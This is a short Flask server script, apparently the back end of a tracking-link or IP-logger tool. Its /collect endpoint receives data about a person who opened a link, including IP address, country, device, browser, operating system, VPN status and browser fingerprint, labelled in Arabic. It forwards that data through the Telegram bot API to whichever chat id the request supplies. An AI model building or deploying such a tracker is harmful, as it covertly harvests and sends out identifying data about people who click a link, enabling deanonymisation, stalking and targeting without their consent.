from flask import Flask, request
import requests, os
from dotenv import load_dotenv
from flask_cors import CORS

load_dotenv()
app = Flask(__name__)
CORS(app)
BOT_TOKEN = os.getenv("BOT_TOKEN")
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

@app.route("/collect", methods=["POST"])
def collect():
    data = request.json
    user_id = data.get("id")
    msg = f"\n👤 مستخدم فتح الرابط:\n\n" \
          f"🌐 IP: {data.get('ip')}\n" \
          f"🏳️ الدولة: {data.get('country')}\n" \
          f"📱 جهاز: {data.get('device')}\n" \
          f"💻 متصفح: {data.get('browser')}\n" \
          f"🧭 نظام: {data.get('os')}\n" \
          f"🛡️ VPN: {data.get('vpn')}\n" \
          f"🧬 بصمة: {data.get('fingerprint')}\n"

    requests.post(TELEGRAM_API, json={
        "chat_id": user_id,
        "text": msg
    })
    return {"status": "ok"}

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
